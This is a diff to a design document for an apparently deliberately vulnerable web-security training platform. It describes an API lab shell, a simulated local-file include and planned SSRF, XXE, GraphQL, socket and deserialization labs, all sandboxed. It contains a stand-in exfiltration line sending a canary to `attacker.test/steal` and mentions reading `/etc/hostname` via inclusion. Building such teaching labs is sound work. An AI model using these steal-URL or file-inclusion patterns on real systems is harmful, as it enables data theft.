@@ -95,8 +95,51 @@ src/districts/index.ts              imports each district index
   - `xss-lab.testkit.ts`: `describeXssLab({ challenge, path, victimOf, attack, preview, fragment, payloads,
     divineSanitizes? })` (section 13, Testing), `xssExploit(path, attack)` (an exploit as the player plays it), and the
     page readers `markerOn`, `stealsOn`, `stolenKey`, `previewSrcdoc`, `signIn`, `labPage`.
+  - `intents.ts`: `mountIntents(router, intents, render)`, `endpointsOf(intents)`, `refusal(text)`, `success(text)` and the
+    types `Intent`, `Outcome`, `Endpoint`, `Render`: a landing page whose forms post back to the lab root with no
+    `action` and a hidden `intent`, each intent also on its own path (section 10, "Routes: intents"). Moved here from
+    the Relic Market shell (Q15); `relic-market/_shared/shop-lab.ts` re-exports it. `intents.spec.ts` tests it.
 - **The Relic Market shop shell** (`relic-market/_shared/`: money, cart, orders, intents, the shop page, its test kit)
   is section 10; its race and time primitives are sections 11 and 12.
+- **The Archive API shell** (`archive-api/_shared/api-lab.ts`, Phase 3: AR-01 ... AR-15), the rules of that district
+  (design B0). It is plumbing for API-only labs: the flaw and every decision stay in `levels/*.ts`, the proof in `model.ts`.
+  - **API-only labs.** `GET /` is an HTML landing page at every level (section 4): the endpoint table (method, path, auth,
+    example), the player's identity and key, the curl note (`signIn: false`: nobody signs in to the REST labs) and the
+    lab's forms. The API itself lives on sub-paths. Every form posts back to the lab root with no `action` and a hidden
+    `intent` (`mountIntents`, above), each intent also on a named path for curl, so `describeLabView` passes.
+  - **Identity.** `apiKeyFor(req)` is the player's key, `ak_pilgrim_<32 hex>`, one per (session, level), kept in `perSession`.
+    The page shows it in `<code data-testid="api-key">` (`views/key.ejs`, "Your API key"). `viewerOf(req)` reads
+    `Authorization: Bearer <key>` and answers `'pilgrim'` or `null`. The curator's key is never shown and never minted
+    here: it is a `curatorKey(sid, level)` seam in the lab's `model.ts`, for the matrix's privileged case. GraphQL labs
+    treat every caller as `pilgrim` unless the lab says otherwise; the socket labs sign in with the usual pilgrim form
+    (`describeSignInView`).
+  - **JSON answers.** `sendJson(res, status, body)` (never cached) and `jsonError(res, status, message)`, which sends
+    `{ "error": "<sentence>" }` with a real status (401, 403, 404, 405, 410, 422). A proof adds the flag with
+    `flagJson(req, challenge)`: `{ flag }` below Divine and `{}` at Divine, which never calls `flagFor`. Spread it into the
+    body, outside `tryDb`: `sendJson(res, 200, { ...record, ...flagJson(req, C) })`. GraphQL answers put the flag in
+    `extensions.flag` instead.
+  - **Proof predicates live in `model.ts`** (`proves(...)`), never in a level file.
+  - **Restart.** A lab whose state can wedge and that has no limiter passes `reset` (AR-08, 09, 10, 11, 13, 14, 15); AR-03
+    has a limiter, so it has none; the rest are read-only.
+  - **Body parsing.** The app-wide `express.json()` parses only `application/json`. A lab that needs another media type
+    mounts `express.json({ type, limit })` or `express.raw(...)` on its OWN route (AR-08, AR-11), and its spec asserts the
+    platform parser leaves those types alone.
+  - **Platform-safety bounds** (not the lesson) live in `model.ts` or `_shared/`: maps at most the stated size, stored
+    strings clipped with the copying `clip`, attacker-keyed maps bounded with `putBounded`.
+  - **The page's data.** `apiView(req, res, { result, curl, endpoints?, console?, extra? })` builds the view data;
+    include `views/key`, `views/endpoints` (the table, `data-testid="endpoints"`; an open GET example is a link) and
+    `views/console` from the lab's own view with `<%- include('../../_shared/views/key', { apiKey: apiKey }) %>` and
+    so on (the console takes `{ requestConsole: requestConsole }`).
+  - **The JSON request console** (decision Q16: no GraphiQL, which would pull React and a large bundle into the offline
+    image). `views/console.ejs` is a plain form (method, path, headers, body textarea, hidden `intent=console`) with
+    **no script at all**: it posts back to the lab, the lab's `console` intent runs the request, and the answer is shown
+    in a `<pre>`. What the player typed is only ever output through the escaped tag. The lab reads the form with
+    `consoleRequestOf(req)` (method restricted to `CONSOLE_METHODS`, every field clipped to `CONSOLE_LIMITS`) and
+    `consoleHeaders(text)` (at most 20 `Name: value` lines, token names, no control characters). A GraphQL lab sends the
+    body to its own engine (a batch is a JSON array); a REST lab dispatches to its own handlers in process.
+  - **Test kit:** `api-lab.testkit.ts`, `describeApiLanding({ challenge, path, endpoints })`: the endpoint table, the
+    player's own key (stable, per level and player, never the sid), the curl note and forms with no `action`. The shell
+    itself is tested with a fixture lab (AA-01) in `tests/api-lab.spec.ts`, as UP-01 and XS-01 fixture their engines.
 - **Shared pieces of the pilgrim labs** (sign in as `pilgrim`, take over the admin's data or page: GK-12 ... GK-18),
   all in `gatekeeper/_shared/`:
   - `pilgrimLogin(req)` + the `views/pilgrim-form.ejs` partial: the sign-in check, form and message.
@@ -178,6 +221,7 @@ case (g)). Divine resists every exploit.
 | `readZip(bytes, limits?)`, `ZIP_LIMITS` | `core/upload-zip` | an archive's entries (names exactly as written, bytes), with a zip-bomb guard; synchronous, inside `tryDb` (section 9) |
 | `simFs(opts?)`, `resolveSimPath(path, separators?)`, `SIMFS_LIMITS` | `core/simfs` | one player's simulated file system per level, made in the `perSession` factory; paths resolved by the simulated OS's rules (section 9) |
 | `simInterpret(bytes, canary)` | `core/simfs` | the "webshell": nothing executes; prints the canary if the file holds `<?hvwa CANARY ?>` (section 9) |
+| `simInclude(bytes, canary)` | `core/simfs` | the simulated include (SC-13): the file printed as text with each `<?hvwa CANARY ?>` replaced by the canary: `{ output, ran }`; nothing executes (section 9) |
 | `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
 | `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
 | `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
@@ -1334,6 +1378,22 @@ worker. A real interpreter would be remote code execution on the host's containe
 need one. The lesson is the upload **filter**, and the token oracle proves it was beaten. The guard spec keeps it that
 way.
 
+### "Including": `simInclude(bytes, canary)` (SC-13, LFI)
+
+An LFI lab does not run a file: the server **includes** it, so the file is printed and any code in it runs. `simInclude`
+is that, simulated, and lives beside `simInterpret` in `core/simfs.ts`. It returns `{ output, ran }`: `output` is the file
+decoded as Latin-1 (so any file works, byte for byte) with **each** `<?hvwa CANARY ?>` (`SIM_SCRIPT_STATEMENT`, the same
+tolerant match as `simInterpret`) replaced by the canary, and `ran` says a statement was there. Any other
+`<?hvwa ...?>` block, and any other "code" (`<?php ?>`, `<%= %>`, `<script>`), stays text. A function canary is called
+once, and only if a statement is present (`simInclude(bytes, () => flagFor(req, C))`); a string canary is inserted
+literally. The output is clipped to `SIM_INCLUDE_OUTPUT_CHARS` (16 KiB) and only the first `SIMFS_LIMITS.fileBytes` (128
+KiB, the largest file a simFs holds) are scanned.
+
+Which file is included, and how its name is resolved, is **the level's** decision (the flawed `resolvePage`), made before
+this is called and measured with `fs.resolve`. Including a file prints it, as PHP's `include` prints non-code text, so a
+page that includes `/etc/hostname` shows it: show the output escaped in a `<pre>`, never as HTML. Nothing executes (no PHP,
+EJS, Node, `eval`, `vm` or child process), and `tests/upload-guard.spec.ts` covers it with the rest of `core/simfs.ts`.
+
 ### Serving uploads to the player's real browser
 
 The simulated server's answer is shown, never re-enacted. **Never send uploaded bytes to the player's browser as an
@@ -1463,6 +1523,9 @@ mountIntents(router, INTENTS, render);
   `outcome.intent` set to the intent that ran. It throws at mount time on a relative or repeated path, on `/`, and on
   the engine's `/_reset` and `/victim/...`. `fields` is documentation for the endpoint list.
 - `refusal(text)` and `success(text)` build an `Outcome`.
+- These live in `src/districts/_shared/intents.ts` (owner decision Q15), because the Archive API labs use them too, and a
+  district never imports another's `_shared/`. `relic-market/_shared/shop-lab.ts` re-exports them, so a Relic Market lab
+  keeps importing them from there. Their tests are `src/districts/_shared/intents.spec.ts`.
 
 **The page.** `render` builds the view data with `shopView(req, res, state, spec)`:
 
@@ -2090,3 +2153,51 @@ Measured on Node 22.22 (Windows, this machine), through the real worker.
   `dist/` (createRequire from `dist/core/ssti/engine.js`), and `dist/core/ssti/engine.js` is the worker entry. No
   asset copy is needed. `verify:dist` only GETs lab pages, so give FP-06/07's `GET /` a default banner rendered
   through the sandbox: `verify:dist` then exercises the worker from `dist/` on every run.
+
+## 15. Network labs (`core/sim` network, `simNet`)
+
+*Stub. Filled by engine task **E5** (Phase 3 plan, design A3).*
+
+Will cover the simulated network that the SSRF labs (SC-16 ... SC-19, AR-10, AR-13) and the XXE out-of-band lab fetch
+through: the IP ground-truth table (`ip.ts`: decimal, octal, hex and IPv6 spellings, mapped and NAT64 addresses,
+`isPublicAddress`), the simulated DNS (`dns.ts`: zones, player records, TTL cache, the rebinding sequence), `simNet`'s fetch
+(`net.ts`: schemes, headers, redirects and their method rewriting, the per-action request cap, ECONNREFUSED vs
+ETIMEDOUT), the fake IMDS (`imds.ts`), `simWorld({ inbox: false })`, `VictimConfig.net` and the attacker log's
+`from: browser | server | dns`. The TEST-NET ranges are the simulated internet (Q12). Nothing leaves the process: no real
+DNS, socket or `fetch`. Until E5 lands there is nothing here to use.
+
+## 16. XXE labs (`core/xmldtd`)
+
+*Stub. Filled by engine task **E6** (design A4).*
+
+Will cover the separate, simulated XML parser the XXE labs (SC-14 DOCX, SC-15 SVG) run their uploads through: a DTD and
+entity model that never feeds the XSS oracle (Q7), `xmlResolver({ fs, net })` resolving `SYSTEM` entities against the
+player's `simFs` and `simNet`, its bounds (entity expansion, depth, size), and the guard spec that keeps it away from the real
+filesystem and network. Until E6 lands there is nothing here to use.
+
+## 17. GraphQL labs (`core/graphql`)
+
+*Stub. Filled by engine task **E7** (design A1).*
+
+Will cover the in-process GraphQL engine of AR-01 ... AR-06: the schema, introspection and its per-level seal, resolvers
+that are the lab's own code, batching (a JSON array), aliases and depth, and their bounds. The page has no GraphiQL
+(Q16): it uses the JSON request console of the Archive API shell (section 1, "The Archive API shell"), and the flag comes
+back in `extensions.flag`. E7 also adds `archive-api/_shared/graphql-lab.ts` (the `send` helper and `describeGraphqlLab`).
+Until E7 lands there is nothing here to use.
+
+## 18. Socket labs (`core/ws`, the simulated socket)
+
+*Stub. Filled by engine task **E8** (design A2; depends on E1, the cross-site engine of section 8).*
+
+Will cover the WebSocket labs AR-14 (cross-site hijacking) and AR-15 (per-message authorization): the `core/ws` server on
+the lab's own route, the simulated socket the victim's browser opens (with the SameSite jar and the attacker page from
+section 8, "Across sites"), the `POST <lab>/ws/frames` HTTP fallback (Q11), frame and connection bounds, and how a
+spec drives a socket. Until E8 lands there is nothing here to use.
+
+## 19. Deserialization labs (sandboxed `unserialize`)
+
+*Stub. Filled by engine task **E9** (design A5; depends on E4, the SSTI sandbox of section 14).*
+
+Will cover SC-20 (node-serialize): `unserialize` runs only inside the QuickJS sandbox of section 14 (`core/ssti/serialized.ts`
+and a sandbox-program addition), never in the host realm; what the guest can reach, the planted values, bounds, and the
+guard spec. Until E9 lands there is nothing here to use.
